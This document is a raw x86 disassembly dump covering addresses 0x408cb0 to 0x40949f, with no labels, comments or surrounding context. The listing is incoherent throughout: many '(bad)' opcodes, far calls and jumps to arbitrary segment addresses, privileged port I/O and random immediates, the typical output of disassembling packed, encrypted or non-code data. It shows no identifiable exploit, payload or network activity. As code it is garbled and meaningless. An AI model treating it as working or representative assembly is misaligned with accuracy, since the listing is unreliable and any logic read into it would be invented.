  408cb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408cb1:	xchg   ah,bh
  408cb3:	mov    DWORD PTR [ebx+0x5c5b76e9],ecx
  408cb9:	sub    DWORD PTR [edi-0x32f49812],esp
  408cbf:	test   al,0xdc
  408cc1:	or     eax,0xb9d527e
  408cc6:	pop    edi
  408cc7:	dec    edi
  408cc8:	sbb    ch,BYTE PTR [eax+0x57]
  408ccb:	pop    edi
  408ccc:	hlt    
  408ccd:	mov    al,ds:0x61285d9a
  408cd2:	xchg   ecx,eax
  408cd3:	frstor [edx+0x7ea7d415]
  408cd9:	xchg   edx,eax
  408cda:	sahf   
  408cdb:	mov    ebp,0x6f0558b0
  408ce0:	mov    dl,0x19
  408ce2:	iret   
  408ce3:	jmp    0x408cd5
  408ce5:	nop
  408ce6:	mov    edi,0x8f0aba05
  408ceb:	jmp    0xdd54aef7
  408cf0:	sahf   
  408cf1:	push   ecx
  408cf3:	push   0x549009b2
  408cf8:	(bad)  
  408cf9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408cfa:	aas    
  408cfb:	cmp    edx,eax
  408cfd:	cmp    BYTE PTR ss:[eax+0x31],bl
  408d01:	xlat   BYTE PTR ds:[ebx]
  408d02:	daa    
  408d03:	pop    ss
  408d04:	push   0x15964a55
  408d09:	push   es
  408d0a:	xchg   esp,eax
  408d0b:	imul   DWORD PTR [ecx+0x9]
  408d0e:	loop   0x408d77
  408d10:	cmp    al,0x7e
  408d12:	mov    eax,0xb20aa787
  408d17:	fmul   QWORD PTR [esi-0x22]
  408d1a:	ss out 0x13,eax
  408d1d:	jp     0x408d5a
  408d1f:	jnp    0x408d99
  408d21:	add    DWORD PTR [edx-0x74e98429],ebx
  408d27:	scas   eax,DWORD PTR es:[edi]
  408d28:	nop
  408d29:	lahf   
  408d2a:	mov    ebp,0xd6c565b8
  408d2f:	addr16 mov bh,0xa6
  408d32:	pop    esi
  408d33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d34:	sahf   
  408d35:	push   esp
  408d36:	call   0xde54:0xcd32e29b
  408d3d:	mov    bl,0x49
  408d3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d40:	pop    DWORD PTR [ecx-0x721e3bd2]
  408d46:	add    eax,0x943a226f
  408d4b:	add    al,0x2f
  408d4d:	sbb    eax,0xddf50717
  408d52:	fdiv   QWORD PTR [eax]
  408d54:	xor    BYTE PTR [edx+ecx*4],bl
  408d57:	push   esp
  408d58:	scas   al,BYTE PTR es:[edi]
  408d59:	mov    ds:0xbc17a790,eax
  408d5e:	or     eax,DWORD PTR fs:[edx]
  408d61:	push   eax
  408d62:	mov    edx,0x18d687a7
  408d67:	shl    edx,1
  408d69:	sub    eax,0xe5b863b1
  408d6e:	add    dl,BYTE PTR ds:0x7899a248
  408d74:	xor    edx,ebp
  408d76:	(bad)  
  408d77:	jg     0x408d9d
  408d79:	adc    al,0xa
  408d7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d7c:	fld    TBYTE PTR [eax+0xb]
  408d7f:	sub    eax,0x18d644b
  408d84:	mov    dl,0x72
  408d86:	inc    ebp
  408d87:	(bad)  
  408d88:	test   al,0x44
  408d8a:	in     eax,0x1a
  408d8c:	jmp    0xedc0:0x379a2408
  408d93:	mov    ah,0x1a
  408d95:	jle    0x408dbd
  408d97:	pop    edx
  408d98:	mov    dl,0x5f
  408d9a:	or     bl,bl
  408d9c:	fcomp  QWORD PTR [ebx+eax*2]
  408da0:	jb     0x408dad
  408da2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408da3:	scas   eax,DWORD PTR es:[edi]
  408da4:	lods   eax,DWORD PTR ds:[esi]
  408da5:	stos   BYTE PTR es:[edi],al
  408da6:	sub    BYTE PTR [ebp+0x4ee49789],ah
  408dac:	mov    dl,0x54
  408dae:	enter  0x3388,0xb0
  408db2:	ret    0xcce7
  408db5:	adc    al,0x2d
  408db7:	cwde   
  408db8:	sub    ecx,ebx
  408dba:	lods   eax,DWORD PTR ds:[esi]
  408dbb:	gs scas eax,DWORD PTR es:[edi]
  408dbd:	add    ecx,DWORD PTR [ebx-0x45]
  408dc0:	(bad)  
  408dc1:	cld    
  408dc2:	in     eax,dx
  408dc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408dc4:	addr16 lahf 
  408dc6:	cmp    eax,0xf8764b78
  408dcb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408dcc:	and    BYTE PTR [esi+0x454077bb],ch
  408dd2:	jge    0x408dfd
  408dd4:	mov    dl,0xe8
  408dd6:	enter  0xf98f,0xe5
  408dda:	shl    BYTE PTR [edi-0xa],cl
  408ddd:	or     esp,DWORD PTR [edx]
  408ddf:	push   eax
  408de0:	push   ss
  408de1:	int    0x3a
  408de3:	sub    al,0x42
  408de5:	fidiv  WORD PTR [esi+ecx*8-0x31]
  408de9:	imul   DWORD PTR [edi]
  408deb:	imul   edx
  408ded:	pop    ds
  408dee:	xlat   BYTE PTR ds:[ebx]
  408def:	loopne 0x408dfe
  408df1:	repz call 0xbdfe:0x1188a3fc
  408df9:	in     eax,dx
  408dfa:	call   0xf827:0x1e240a16
  408e01:	pushf  
  408e02:	jbe    0x408dab
  408e04:	cdq    
  408e05:	out    dx,eax
  408e06:	mov    ds:0x5b1f53f5,al
  408e0b:	or     BYTE PTR [edx-0x7a94ec2a],dh
  408e11:	add    ebp,DWORD PTR [edx-0x77f4d90d]
  408e17:	mov    cl,0x6e
  408e19:	xchg   cl,ah
  408e1b:	add    eax,0x1d9ae425
  408e20:	xchg   ebx,eax
  408e21:	push   ss
  408e22:	in     eax,0x2
  408e24:	jns    0x408de9
  408e26:	cld    
  408e27:	call   FWORD PTR [edx+0x67219a09]
  408e2d:	pop    es
  408e2e:	add    ch,BYTE PTR [ecx*2-0x17bc6581]
  408e35:	jo     0x408dc5
  408e37:	das    
  408e38:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  408e3a:	dec    eax
  408e3b:	mov    eax,0x67dc1588
  408e40:	xchg   esp,eax
  408e41:	lea    esi,[ebp-0x30]
  408e44:	out    dx,al
  408e45:	outs   dx,BYTE PTR ds:[esi]
  408e46:	in     eax,0xaf
  408e48:	mov    dl,0x85
  408e4a:	mov    esi,0x8261eb33
  408e4f:	lods   al,BYTE PTR ds:[esi]
  408e50:	cmp    eax,0xff065a0b
  408e55:	dec    ebp
  408e56:	sub    ebx,ecx
  408e58:	das    
  408e59:	mov    ds:0xef88a6e7,eax
  408e5e:	shl    DWORD PTR [edi-0x2099ff82],1
  408e64:	sbb    ebx,DWORD PTR [ebx-0x77]
  408e67:	push   ecx
  408e68:	iret   
  408e69:	or     edx,DWORD PTR [edx]
  408e6b:	outs   dx,BYTE PTR ds:[esi]
  408e6c:	(bad)  
  408e6d:	test   BYTE PTR [edi-0x65bdf080],0xf5
  408e74:	mov    WORD PTR [ebx],fs
  408e76:	sbb    al,0xc
  408e78:	mov    esp,ebp
  408e7a:	and    DWORD PTR [edi+0x1dc0aba0],0x2
  408e81:	stos   BYTE PTR es:[edi],al
  408e82:	repz push 0x53c84ab3
  408e88:	inc    edi
  408e89:	xchg   esp,eax
  408e8a:	sbb    ah,BYTE PTR [edx-0x635503b6]
  408e90:	push   ecx
  408e91:	imul   ebx,DWORD PTR [edx],0x4275a2b
  408e97:	or     eax,ecx
  408e99:	outs   dx,DWORD PTR ds:[esi]
  408e9a:	xchg   ebx,eax
  408e9b:	sub    dl,0xe1
  408e9e:	repnz stos DWORD PTR es:[edi],eax
  408ea0:	ds lahf 
  408ea2:	test   al,0xba
  408ea4:	jle    0x408eb7
  408ea6:	inc    edx
  408ea7:	daa    
  408ea8:	(bad)  
  408ea9:	rcr    DWORD PTR [ecx],1
  408eab:	cmp    ah,BYTE PTR [ecx+0x27259a1d]
  408eb1:	add    eax,0xeafdcc2
  408eb6:	cmc    
  408eb7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408eb8:	jmp    0xc478ba34
  408ebd:	mov    ch,0xc7
  408ebf:	test   al,0xb5
  408ec1:	push   ebp
  408ec2:	push   edi
  408ec3:	test   DWORD PTR [ebp-0x6e1fe59d],ebx
  408ec9:	dec    ebx
  408eca:	push   esi
  408ecb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408ecc:	out    dx,al
  408ecd:	sub    eax,DWORD PTR [edx+0x2c5625c9]
  408ed3:	pop    ebx
  408ed4:	mov    esi,0xb6dd9ab6
  408ed9:	fsub   QWORD PTR ds:0x835f2b3
  408edf:	mov    ds:0xffd1ec12,al
  408ee4:	cmc    
  408ee5:	mov    ebp,DWORD PTR [ebp-0x21]
  408ee8:	das    
  408ee9:	adc    DWORD PTR [edx+0x144a3aa6],ebx
  408eef:	(bad)
  408ef2:	jg     0x408eca
  408ef4:	into   
  408ef5:	or     ecx,DWORD PTR [ecx]
  408ef7:	lahf   
  408ef8:	adc    DWORD PTR [esi-0x3f902b27],ebp
  408efe:	call   0xd8ce:0x581d2832
  408f05:	out    0xd2,eax
  408f07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f08:	push   ecx
  408f09:	mov    fs,WORD PTR [edi-0x5781ec04]
  408f0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f10:	mov    dl,0xf3
  408f12:	sar    DWORD PTR [ebx+0x1564e9ea],cl
  408f18:	cmp    cl,BYTE PTR [ebx]
  408f1a:	inc    eax
  408f1b:	mov    edi,0x6f2a72a1
  408f20:	lahf   
  408f21:	data16 mov ds,WORD PTR [ecx+edx*1+0x7a755e2]
  408f29:	fisubr WORD PTR [esi+eax*2+0x56]
  408f2d:	pop    ss
  408f2e:	xchg   DWORD PTR [ecx-0x5bae8da0],ecx
  408f34:	inc    edi
  408f35:	add    bl,BYTE PTR [eax-0x77]
  408f38:	inc    edx
  408f39:	pop    edi
  408f3a:	das    
  408f3b:	cdq    
  408f3c:	mov    dl,0x97
  408f3e:	sub    DWORD PTR [edx],esi
  408f40:	jnp    0x408f6b
  408f42:	jecxz  0x408f4a
  408f44:	and    dh,BYTE PTR ds:0x413cda6c
  408f4a:	dec    esi
  408f4b:	(bad)  
  408f4c:	scas   al,BYTE PTR es:[edi]
  408f4d:	or     edx,DWORD PTR [esi-0x37fb8cc0]
  408f53:	jnp    0x408f07
  408f55:	nop
  408f56:	sar    DWORD PTR [eax+ebp*4-0x1ddb2c26],0xb
  408f5e:	jl     0x408fdc
  408f60:	adc    DWORD PTR [edi+0x77],edx
  408f63:	push   ebx
  408f64:	and    ecx,DWORD PTR [ecx+0x76]
  408f67:	int    0xb2
  408f69:	es push cs
  408f6b:	icebp  
  408f6c:	pop    es
  408f6d:	mov    dl,0x5a
  408f6f:	sbb    eax,DWORD PTR [edi+0x244d6404]
  408f75:	dec    edi
  408f76:	jp     0x408efe
  408f78:	mov    ah,0x75
  408f7a:	jmp    0x408f87
  408f7c:	mov    dl,0xa0
  408f7e:	scas   al,BYTE PTR es:[edi]
  408f7f:	add    BYTE PTR [ecx+0x1b],cl
  408f82:	add    cl,BYTE PTR [esi-0x2c]
  408f85:	or     eax,DWORD PTR [esp+esi*4+0x6fb384e]
  408f8c:	and    BYTE PTR [ebp+0x1c500972],ch
  408f92:	test   eax,ebx
  408f94:	mov    esp,0xeda45a2d
  408f99:	mov    cl,0x25
  408f9b:	cmp    eax,0x802d0b45
  408fa0:	fild   QWORD PTR [ebx]
  408fa2:	fidivr WORD PTR [ebp+0x2b]
  408fa5:	jge    0x408f41
  408fa7:	jno    0x40901c
  408fa9:	adc    al,0xfe
  408fab:	xor    ebx,ebp
  408fad:	jbe    0x408fc3
  408faf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408fb0:	retf   0xf64e
  408fb3:	inc    ecx
  408fb4:	or     al,0x5d
  408fb6:	mov    edi,0x35b9b200
  408fbb:	out    0xc0,eax
  408fbd:	leave  
  408fbe:	jle    0x6109420
  408fc4:	jp     0x408f71
  408fc6:	mov    edx,0x715b6830
  408fcb:	and    ebp,DWORD PTR [esi-0xd8ecd48]
  408fd1:	nop
  408fd2:	push   es
  408fd3:	scas   eax,DWORD PTR es:[edi]
  408fd4:	ins    DWORD PTR es:[edi],dx
  408fd5:	popf   
  408fd6:	add    eax,0x9aad5d9e
  408fdb:	mov    bl,0x82
  408fdd:	(bad)  
  408fde:	nop
  408fdf:	xor    al,0xae
  408fe1:	jne    0x408f7b
  408fe3:	sahf   
  408fe4:	ins    BYTE PTR es:[edi],dx
  408fe5:	je     0x409029
  408fe7:	or     BYTE PTR [edx-0x18],bh
  408fea:	inc    edx
  408feb:	nop    esp
  408fee:	pop    ebp
  408fef:	mov    al,ds:0xf6717a86
  408ff4:	xchg   esp,eax
  408ff5:	mov    ebx,0x31ac9aa9
  408ffa:	pusha  
  408ffb:	mov    esp,0xc31b6eb2
  409000:	push   0xe
  409002:	leave  
  409003:	into   
  409004:	ror    BYTE PTR ds:0xc57778e0,cl
  40900a:	fcomip st,st(3)
  40900c:	mov    bl,0x8b
  40900e:	sbb    bh,0x89
  409011:	(bad)  
  409012:	mov    ebp,0x8a9e7a6d
  409017:	cdq    
  409018:	inc    eax
  409019:	call   0xec5b:0xb91a98d
  409020:	or     al,0xf0
  409022:	xchg   esi,eax
  409023:	lahf   
  409024:	lods   eax,DWORD PTR ds:[esi]
  409025:	fild   QWORD PTR [edi+eiz*2-0x3e76f70e]
  40902c:	sub    al,0xc8
  40902e:	push   edx
  40902f:	fwait
  409030:	inc    edx
  409031:	sub    DWORD PTR [edx-0x170a150d],ebx
  409037:	push   0x9
  409039:	pop    ss
  40903a:	call   0x4d34:0x5f0572b3
  409041:	stc    
  409042:	mov    ebp,0x786667a7
  409047:	jle    0x409012
  409049:	mov    esp,0xedb22041
  40904e:	out    dx,al
  40904f:	xor    eax,0x3875988f
  409054:	push   0xb
  409056:	and    bh,BYTE PTR [edi]
  409058:	lods   eax,DWORD PTR cs:[esi]
  40905a:	(bad)  
  40905b:	pop    ecx
  40905c:	shl    DWORD PTR [ebp+0x3a],1
  40905f:	add    al,BYTE PTR [ebp-0x6a]
  409062:	xchg   esi,eax
  409063:	lea    ecx,[eax+0x61b768d7]
  409069:	or     DWORD PTR [eax],esi
  40906b:	add    eax,0xf5d43d8
  409070:	jb     0x409052
  409072:	rcl    BYTE PTR [ecx],1
  409074:	mov    al,0x9d
  409076:	mov    BYTE PTR [esi-0x18cbd084],dl
  40907c:	ja     0x409055
  40907e:	or     ax,0xb672
  409083:	mov    ebx,0xbdb48cb1
  409088:	jmp    0xb86b9ab8
  40908d:	loopne 0x40902a
  40908f:	push   es
  409090:	xor    eax,0xb59cefcb
  409095:	mov    esi,DWORD PTR [esi-0x5a]
  409098:	fist   WORD PTR [ebx+0x6]
  40909b:	inc    ecx
  40909c:	mov    ch,0x71
  40909e:	pushf  
  40909f:	scas   al,BYTE PTR es:[edi]
  4090a0:	jae    0x4090ed
  4090a2:	lods   al,BYTE PTR ds:[esi]
  4090a3:	inc    esp
  4090a4:	or     ebx,DWORD PTR [ebx]
  4090a6:	call   0xfa03:0xc146a05e
  4090ad:	cs sbb al,0x59
  4090b0:	jle    0x4090c0
  4090b2:	adc    dh,BYTE PTR [ebp+0x3b]
  4090b5:	pop    ebx
  4090b6:	inc    edx
  4090b7:	daa    
  4090b8:	push   eax
  4090b9:	pop    esi
  4090ba:	stc    
  4090bb:	nop
  4090bc:	mov    dl,0x42
  4090be:	xor    eax,0xf5742caa
  4090c3:	xor    DWORD PTR [eax+0xb],ebx
  4090c6:	in     eax,dx
  4090c7:	cdq    
  4090c8:	adc    ah,BYTE PTR gs:[esi]
  4090cb:	dec    edx
  4090cc:	pop    ss
  4090cd:	fstp   TBYTE PTR [edx-0x40]
  4090d0:	mov    dl,0x3f
  4090d2:	bndldx (bad),[esi-0xe4c64e8]
  4090d9:	add    BYTE PTR [ecx],ch
  4090db:	and    dh,BYTE PTR cs:[edx]
  4090de:	adc    al,0xda
  4090e0:	repnz xor ebp,DWORD PTR [edi-0x76]
  4090e4:	shl    BYTE PTR [edi-0x66],0x18
  4090e8:	in     al,dx
  4090e9:	rcr    ecx,cl
  4090eb:	pushf  
  4090ec:	dec    esi
  4090ed:	adc    eax,0x438fa786
  4090f2:	or     DWORD PTR [edi],eax
  4090f4:	cmp    BYTE PTR [ebx],ah
  4090f6:	jmp    0xdeba:0x5e50b1ec
  4090fd:	data16 (bad) 
  4090ff:	jg     0x409092
  409101:	mov    ds,WORD PTR [ecx]
  409103:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409104:	push   0xd883601e
  409109:	cmp    BYTE PTR [ebp+0xf],dl
  40910c:	mov    cl,0x14
  40910e:	stos   BYTE PTR es:[edi],al
  40910f:	lahf   
  409110:	push   ecx
  409111:	jnp    0x409117
  409113:	or     al,0xd4
  409115:	rol    BYTE PTR [edi+eiz*1-0x22],1
  409119:	fdivr  DWORD PTR ds:0x10c4fa4
  40911f:	enter  0xfec9,0x15
  409123:	ja     0x40910f
  409125:	dec    eax
  409126:	push   ebp
  409127:	lock mov DWORD PTR [edx+edi*4+0x27],edi
  40912c:	sub    eax,0xb91db2fc
  409131:	ret    
  409132:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  409134:	adc    edx,edx
  409136:	mov    ds:0x102ca685,eax
  40913b:	stos   BYTE PTR es:[edi],al
  40913c:	scas   al,BYTE PTR es:[edi]
  40913d:	mov    bl,0x73
  40913f:	xor    BYTE PTR [edx],0x47
  409142:	stos   BYTE PTR es:[edi],al
  409143:	inc    ebx
  409144:	(bad)  
  409146:	imul   edi,DWORD PTR [ecx-0x18eb9f09],0x1ec1c680
  409150:	jnp    0x4090f3
  409152:	cwde   
  409153:	sbb    bl,ch
  409155:	cli    
  409156:	adc    eax,0x787ea863
  40915b:	xchg   ebx,eax
  40915c:	shr    BYTE PTR [edx-0x154d2933],cl
  409162:	and    eax,DWORD PTR [esi]
  409164:	je     0x4091ca
  409166:	dec    edx
  409167:	lods   eax,DWORD PTR ds:[esi]
  409168:	dec    ecx
  409169:	je     0x40917e
  40916b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40916c:	loope  0x40914e
  40916e:	hlt    
  40916f:	ins    BYTE PTR es:[edi],dx
  409170:	std    
  409171:	mov    edi,0x89ad3f8b
  409176:	push   eax
  409177:	shl    DWORD PTR [ecx+edx*1-0x65],0xb1
  40917c:	dec    ebp
  40917d:	push   ebx
  40917e:	ds sti 
  409180:	xor    bh,0x97
  409183:	fistp  DWORD PTR [esi+0x8]
  409186:	enter  0x2824,0xd5
  40918a:	cli    
  40918b:	push   edi
  40918c:	bound  edx,QWORD PTR [eax-0x3772f2d3]
  409192:	stc    
  409193:	aad    0xb1
  409195:	mov    al,0x9c
  409197:	icebp  
  409198:	out    dx,al
  409199:	lea    edi,[ecx+0x4f]
  40919c:	mov    esp,0x331fef67
  4091a1:	or     ebx,DWORD PTR [esi]
  4091a3:	and    eax,0xffdf300c
  4091a8:	in     al,0xdb
  4091aa:	call   0x9ff0:0x4375527f
  4091b1:	(bad)  
  4091b2:	xor    dl,al
  4091b4:	mov    cl,0x75
  4091b6:	xlat   BYTE PTR ds:[ebx]
  4091b7:	mov    eax,0x678a946e
  4091bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4091bd:	mov    DWORD PTR [ecx-0x15c039b3],esp
  4091c3:	inc    edi
  4091c4:	mov    dl,0xec
  4091c6:	popf   
  4091c7:	aad    0x2f
  4091c9:	adc    BYTE PTR fs:[edx],0x0
  4091cd:	or     eax,DWORD PTR [ebp+0x262e0c98]
  4091d3:	lock pop eax
  4091d5:	mov    eax,ds:0x1e35c79a
  4091da:	mov    ah,0xb7
  4091dc:	mov    ebx,0x67a76bd8
  4091e1:	repnz data16 fld DWORD PTR [esi+0x23]
  4091e6:	xchg   edx,eax
  4091e7:	inc    ecx
  4091e8:	mov    ebp,0x1b9751e2
  4091ed:	jmp    0x4091e8
  4091ef:	std    
  4091f0:	sub    BYTE PTR [ebx],dl
  4091f2:	outs   dx,DWORD PTR ds:[esi]
  4091f3:	test   eax,0xd37d1071
  4091f8:	mov    eax,0x41a76696
  4091fd:	push   es
  4091fe:	inc    edx
  4091ff:	inc    esi
  409200:	add    DWORD PTR [ebx+0x195b6b9a],ebp
  409206:	mov    esp,0xf527e1f9
  40920b:	lahf   
  40920c:	ds adc eax,0x3320559a
  409212:	call   0x8748e2aa
  409217:	mov    eax,0xb2da5e14
  40921c:	(bad)  
  40921d:	out    dx,al
  40921e:	adc    BYTE PTR [ebp-0x54],ah
  409221:	icebp  
  409222:	mov    eax,0xb4b79ea7
  409227:	or     DWORD PTR [ebp-0x2c],esp
  40922a:	je     0x40921d
  40922c:	mov    dl,0xd3
  40922e:	xchg   DWORD PTR [edi+0x5bacef9f],edx
  409234:	xchg   esp,eax
  409235:	js     0x409208
  409237:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409238:	jnp    0x4092b9
  40923a:	push   ebp
  40923b:	push   edi
  40923c:	mov    eax,0xb22ef46d
  409241:	pop    esp
  409242:	je     0x409227
  409244:	ds push cs
  409246:	inc    esi
  409247:	aad    0xec
  409249:	or     al,0x99
  40924b:	jmpw   0x5499
  40924f:	ja     0x4091d1
  409251:	and    al,0xa3
  409253:	shl    DWORD PTR [edx+0x2669cf13],0x8c
  40925a:	sub    eax,0xdc0bf87a
  40925f:	xchg   ecx,eax
  409260:	xchg   edi,eax
  409261:	xchg   bh,bh
  409263:	dec    ebp
  409264:	(bad)  
  409265:	mov    ah,0xe5
  409267:	xchg   esp,eax
  409268:	push   ebx
  409269:	leave  
  40926a:	adc    eax,0xd78e9270
  40926f:	clc    
  409270:	or     al,BYTE PTR [ebx+0x3295ddd2]
  409276:	sbb    eax,DWORD PTR [ebx+0xa94eb11]
  40927c:	(bad)  
  40927d:	or     ebp,DWORD PTR [edx]
  40927f:	inc    ebx
  409280:	bound  ebp,QWORD PTR ds:0xadcba741
  409286:	ror    BYTE PTR [edi+eiz*1+0x3d],cl
  40928a:	xchg   ebp,eax
  40928b:	iret   
  40928c:	push   edx
  40928d:	std    
  40928e:	mov    DWORD PTR [ecx+0x36],esp
  409291:	jp     0x40922d
  409293:	pop    edi
  409294:	mov    al,0x42
  409296:	mov    eax,ds:0x7c0b107d
  40929b:	mov    eax,ds:0x8bd6f96a
  4092a0:	test   BYTE PTR [ecx+0xb5a47a4],ah
  4092a6:	mov    ecx,0x2232033f
  4092ab:	ret    
  4092ac:	xchg   BYTE PTR [ebx],cl
  4092ae:	pop    edx
  4092af:	jl     0x409306
  4092b1:	xchg   ah,dl
  4092b3:	lock jp 0x40927d
  4092b6:	call   0x8260:0xdc1be85e
  4092bd:	cmp    BYTE PTR [ebx+0x12bb27a7],bl
  4092c3:	push   0x33
  4092c5:	sbb    al,0x7a
  4092c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4092c8:	mov    dl,0x3
  4092ca:	sbb    cl,BYTE PTR [ecx]
  4092cc:	rol    dl,1
  4092ce:	dec    edx
  4092cf:	clc    
  4092d0:	add    BYTE PTR [ebx],cl
  4092d2:	outs   dx,DWORD PTR ds:[esi]
  4092d3:	(bad)  
  4092d4:	pop    edi
  4092d6:	jmp    0x9a5d5189
  4092db:	ficom  DWORD PTR [eax]
  4092dd:	or     ch,BYTE PTR [edi+ebp*1-0x58411bfb]
  4092e4:	sub    DWORD PTR [ebp-0x1b],eax
  4092e7:	xor    al,0x85
  4092e9:	add    eax,0xfc4a21cb
  4092ee:	call   0x3bed:0x7be74ab2
  4092f5:	mov    ebx,0xb528a7e2
  4092fa:	mov    esi,0xc6abf4ad
  4092ff:	push   edx
  409300:	iret   
  409301:	push   esi
  409302:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409303:	(bad)  
  409304:	sub    al,0xb7
  409306:	outs   dx,BYTE PTR ds:[esi]
  409307:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409308:	sub    eax,eax
  40930a:	ror    ch,0x50
  40930d:	test   eax,0x22baa0da
  409312:	dec    edx
  409313:	mul    DWORD PTR [ecx]
  409315:	dec    ebx
  409316:	div    ebp
  409318:	cmp    edi,DWORD PTR [ebp-0xf96a666]
  40931e:	or     esi,DWORD PTR [ebp-0x586d787c]
  409324:	pusha  
  409325:	mov    cl,0x35
  409327:	jae    0x409349
  409329:	(bad)  
  40932a:	int    0xc9
  40932c:	mov    ch,0xcd
  40932e:	dec    BYTE PTR [ecx-0x5f]
  409331:	stos   BYTE PTR es:[edi],al
  409332:	std    
  409333:	xor    DWORD PTR [edx+0x5f],esp
  409336:	cmp    BYTE PTR [ecx-0x21],ch
  409339:	or     ebp,DWORD PTR [eax+0x862172c]
  40933f:	inc    eax
  409340:	std    
  409341:	lock call 0x85de:0x8f944ff7
  409349:	mov    ecx,0x6df5a757
  40934e:	imul   edi,DWORD PTR [ecx],0x65
  409351:	sub    BYTE PTR [esi],bl
  409353:	sub    DWORD PTR [esi+eiz*2-0x224de19f],0x451f7f39
  40935e:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  409360:	mov    al,0xc2
  409362:	sub    eax,0xeac48fa2
  409367:	inc    eax
  409368:	xor    ch,BYTE PTR [eax]
  40936a:	test   al,0x57
  40936c:	lea    ecx,[edx]
  40936e:	addr16 daa 
  409370:	rol    BYTE PTR [eax],1
  409372:	mov    eax,eax
  409374:	fist   DWORD PTR [esi+eax*2+0x269177a7]
  40937b:	fsubr  st,st(7)
  40937d:	mov    ah,0x3
  40937f:	adc    esi,DWORD PTR [ecx+0x131a2cae]
  409385:	(bad)  
  409386:	test   eax,0xbe08f657
  40938b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40938c:	jg     0x409366
  40938e:	pop    edx
  40938f:	lods   al,BYTE PTR ds:[esi]
  409390:	ret    0x7890
  409393:	daa    
  409394:	push   edx
  409395:	enter  0x4002,0xb5
  409399:	and    ecx,DWORD PTR [esi-0x72122b78]
  40939f:	mov    ds:0xee1830e2,eax
  4093a4:	loope  0x4093db
  4093a6:	cmp    DWORD PTR [edi],edi
  4093a8:	xor    al,BYTE PTR [ebx-0x3a]
  4093ab:	push   ss
  4093ac:	jbe    0x40941b
  4093ae:	push   edi
  4093af:	add    eax,0x2f9a6fce
  4093b4:	repz lea esi,gs:[ecx-0x58dea38f]
  4093bc:	and    eax,0x9401198c
  4093c1:	fcmovu st,st(0)
  4093c3:	pop    ss
  4093c4:	(bad)  
  4093c5:	clc    
  4093c6:	mov    edx,0xf2eb9ea4
  4093cb:	mov    BYTE PTR [eax],bh
  4093cd:	mov    ds:0xa641bad,eax
  4093d2:	mov    ecx,0x82520d80
  4093d7:	lods   al,BYTE PTR ds:[esi]
  4093d8:	ror    edi,cl
  4093da:	inc    edi
  4093db:	push   es
  4093dc:	mov    ch,0x6e
  4093de:	or     BYTE PTR [edx-0x3f8599e9],bh
  4093e4:	mov    cl,0xef
  4093e6:	mov    esp,DWORD PTR [edi-0x50bf21fa]
  4093ec:	int3   
  4093ed:	call   0x32f2f973
  4093f2:	dec    ecx
  4093f3:	ret    0x9dc7
  4093f6:	xor    al,0x26
  4093f9:	sbb    eax,0xb9ba873
  4093fe:	fisubr DWORD PTR [ecx+ecx*4-0x4caa5bae]
  409405:	sbb    al,0x1a
  409407:	inc    ebp
  409408:	ret    0x240e
  40940b:	mov    dh,0x46
  40940d:	dec    edi
  40940e:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409410:	mov    ds:0x13ba4705,al
  409415:	clc    
  409416:	std    
  409417:	out    0x16,eax
  409419:	mov    es,WORD PTR [edx-0x711648c1]
  40941f:	popa   
  409420:	daa    
  409421:	pop    esp
  409422:	pop    ecx
  409423:	pop    ebp
  409424:	mov    ah,0xc3
  409426:	add    edi,eax
  409428:	xchg   edi,eax
  409429:	or     esp,DWORD PTR ds:0x1fb85d79
  40942f:	call   esi
  409431:	or     bl,BYTE PTR [ebp-0x4c75e494]
  409437:	repnz xor cl,bh
  40943a:	test   ecx,edi
  40943c:	jo     0x409449
  40943e:	sub    BYTE PTR [eax-0x29ff1f02],dl
  409444:	add    al,0x71
  409446:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409447:	aaa    
  409448:	pop    esp
  409449:	push   cs
  40944a:	(bad)  
  40944b:	sub    eax,0x421a98dd
  409450:	add    al,0x47
  409453:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409454:	test   ebx,esi
  409456:	mov    al,0xc7
  409458:	test   eax,0xb2241534
  40945d:	stos   DWORD PTR es:[edi],eax
  40945e:	stc    
  40945f:	fmul   DWORD PTR [esi-0x1626cb21]
  409465:	or     esi,DWORD PTR [ebp-0xb]
  409468:	arpl   WORD PTR [eax-0x69],si
  40946b:	xor    BYTE PTR [esi+0x25],dh
  40946e:	call   0xfcb3:0x5bb1c195
  409475:	push   ebx
  409476:	in     al,0xd8
  409478:	or     dx,WORD PTR [edx-0x48]
  40947c:	hlt    
  40947d:	inc    edx
  40947e:	push   cs
  40947f:	push   ss
  409480:	or     eax,0x2f439aac
  409485:	shl    DWORD PTR [ecx-0x16],cl
  409488:	test   DWORD PTR [ebx+0x6087a9f9],ebx
  40948e:	jg     0x409411
  409490:	repnz add cl,BYTE PTR [ecx-0x658eedfb]
  409497:	stc    
  409498:	call   0xa5ba:0xc1bfcbb0
  40949f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
